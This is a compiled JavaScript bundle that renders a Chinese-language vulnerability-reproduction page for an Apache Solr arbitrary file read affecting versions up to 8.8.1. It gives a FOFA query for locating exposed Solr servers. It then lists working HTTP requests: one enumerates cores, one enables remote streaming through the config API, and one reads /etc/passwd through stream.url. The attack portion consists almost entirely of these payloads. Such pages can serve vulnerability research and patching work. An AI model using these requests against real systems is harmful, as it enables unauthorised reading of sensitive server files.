(window.webpackJsonp=window.webpackJsonp||[]).push([[197],{2136:function(a,s,e){a.exports=e.p+"assets/img/deaf982e-2ddb-4021-9b5b-21ac946a910a.41ed15e0.png"},2137:function(a,s,e){a.exports=e.p+"assets/img/image-20220307142829893.660fedbc.png"},2138:function(a,s,e){a.exports=e.p+"assets/img/image-20220307142740665.fd37316e.png"},2630:function(a,s,e){"use strict";e.r(s);var t=e(75),r=Object(t.a)({},(function(){var a=this,s=a.$createElement,t=a._self._c||s;return t("ContentSlotsDistributor",{attrs:{"slot-key":a.$parent.slotKey}},[t("h1",{attrs:{id:"apache-solr-config-任意文件读取漏洞"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#apache-solr-config-任意文件读取漏洞"}},[a._v("#")]),a._v(" Apache Solr config 任意文件读取漏洞")]),a._v(" "),t("h2",{attrs:{id:"漏洞描述"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#漏洞描述"}},[a._v("#")]),a._v(" 漏洞描述")]),a._v(" "),t("p",[a._v("Apache Solr 存在任意文件读取漏洞，攻击者可以在未授权的情况下获取目标服务器敏感文件")]),a._v(" "),t("h2",{attrs:{id:"漏洞影响"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#漏洞影响"}},[a._v("#")]),a._v(" 漏洞影响")]),a._v(" "),t("a-checkbox",{attrs:{checked:""}},[a._v("Apache Solr <= 8.8.1")]),t("br"),a._v(" "),t("h2",{attrs:{id:"网络测绘"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#网络测绘"}},[a._v("#")]),a._v(" 网络测绘")]),a._v(" "),t("a-checkbox",{attrs:{checked:""}},[t("a-button",{attrs:{href:"https://fofa.info/result?qbase64=YXBwPSJBUEFDSEUtU29sciI%3D"}},[a._v('FOFA: app="APACHE-Solr"')])],1),a._v(" "),t("h2",{attrs:{id:"漏洞复现"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#漏洞复现"}},[a._v("#")]),a._v(" 漏洞复现")]),a._v(" "),t("p",[a._v("访问 Solr Admin 管理员页面")]),a._v(" "),t("p",[t("img",{attrs:{src:e(2136),alt:"deaf982e-2ddb-4021-9b5b-21ac946a910a"}})]),a._v(" "),t("p",[a._v("获取core的信息")]),a._v(" "),t("div",{staticClass:"language- line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-text"}},[t("code",[a._v("/solr/admin/cores?indexInfo=false&wt=json\n")])]),a._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[a._v("1")]),t("br")])]),t("p",[t("img",{attrs:{src:e(2137),alt:"image-20220307142829893"}})]),a._v(" "),t("p",[a._v("发送请求")]),a._v(" "),t("div",{staticClass:"language- line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-text"}},[t("code",[a._v('POST /solr/core/config \nContent-Type: application/json\n\n{"set-property":{"requestDispatcher.requestParsers.enableRemoteStreaming":true},"olrkzv64tv":"="}\n')])]),a._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[a._v("1")]),t("br"),t("span",{staticClass:"line-number"},[a._v("2")]),t("br"),t("span",{staticClass:"line-number"},[a._v("3")]),t("br"),t("span",{staticClass:"line-number"},[a._v("4")]),t("br")])]),t("p",[a._v("再进行文件读取")]),a._v(" "),t("div",{staticClass:"language- line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-text"}},[t("code",[a._v("POST /solr/core/debug/dump?param=ContentStreams \n\nstream.url=file:///etc/passwd\n")])]),a._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[a._v("1")]),t("br"),t("span",{staticClass:"line-number"},[a._v("2")]),t("br"),t("span",{staticClass:"line-number"},[a._v("3")]),t("br")])]),t("p",[t("img",{attrs:{src:e(2138),alt:"image-20220307142740665"}})])],1)}),[],!1,null,null,null);s.default=r.exports}}]);